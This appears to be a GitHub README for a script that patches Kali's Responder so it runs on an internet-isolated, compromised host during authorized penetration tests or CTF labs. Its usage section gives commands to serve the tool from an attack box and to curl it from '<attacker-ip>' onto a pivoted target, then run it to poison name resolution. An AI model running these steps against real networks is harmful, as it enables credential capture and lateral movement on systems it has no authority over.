# Original Creator / Credit

[SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

All actual functionality belongs to **[Responder](https://github.com/SpiderLabs/Responder)** by Laurent Gaffie / SpiderLabs (Trustwave), licensed under the GNU GPLv3. This repository does **not** redistribute Responder's source code — it ships a small, standalone patch/setup script meant to run against your own copy of the official tool. If you find Responder useful, go star and credit the original project.

## ⚠️ Disclaimer

This repository exists for **security research, authorized penetration testing, and CTF/training purposes only** — for example Hack The Box, TryHackMe, OSCP/CPTS-style labs, or engagements covered by explicit written authorization.

## The problem this solves

Kali's packaged build of Responder unconditionally imports `aioquic` near the top of `utils.py`, and calls `sys.exit()` if the import fails — even though `aioquic` is only actually used by the optional QUIC poisoning server. On an internet-isolated target (a common situation when pivoting through a compromised host with no outbound access), there's no way to `pip install` the missing dependency, so Responder refuses to start at all, regardless of what's enabled in `Responder.conf`.

Separately, Kali ships `Responder.conf` as a symlink pointing at `/etc/responder/Responder.conf`. If you `tar` the `/usr/share/responder` directory without dereferencing symlinks (the default `tar` behavior), the archive preserves the symlink but not its target. On a fresh host the link is then dangling, Python's `configparser` silently sees zero sections rather than raising an error immediately, and Responder only crashes later with a confusing `configparser.NoSectionError: No section: 'Responder Core'`.

## What `fix-responder.sh` does

1. Installs a real `Responder.conf` over a broken or missing symlink, if you supply one as the second argument.
2. Sets `QUIC = Off` in the config, for consistency with the patch below.
3. Neutralizes the unconditional `aioquic` import in `utils.py`, so a missing dependency no longer kills the entire script.
4. Verifies `utils.py` still parses as valid Python after patching, and keeps a timestamped backup of the original.
5. Reports any TCP ports Responder won't be able to bind to because another local service already owns them (this check is skipped gracefully if `ss` isn't available on the target).

The script is idempotent — safe to run more than once against the same directory without re-patching or breaking anything.

## Usage

**On your attack box**, stage the three files you'll need:

```bash
cd /tmp
tar czf /tmp/responder.tar.gz -C /usr/share responder
cp /etc/responder/Responder.conf /tmp/Responder.conf.real
wget https://raw.githubusercontent.com/Boon-Rekcah/responder-on-the-fly/refs/heads/main/fix-responder.sh
chmod +x /tmp/fix-responder.sh
python3 -m http.server 80
```

**On the target**, through whatever pivot or tunnel you've established:

```bash
curl http://<attacker-ip>/responder.tar.gz -o responder.tar.gz
curl http://<attacker-ip>/Responder.conf.real -o Responder.conf.real
curl http://<attacker-ip>/fix-responder.sh -o fix-responder.sh
chmod +x fix-responder.sh
tar xzf responder.tar.gz
./fix-responder.sh responder/ Responder.conf.real
```

**Launch Responder:**

```bash
cd responder
python3 Responder.py -I <interface>
```
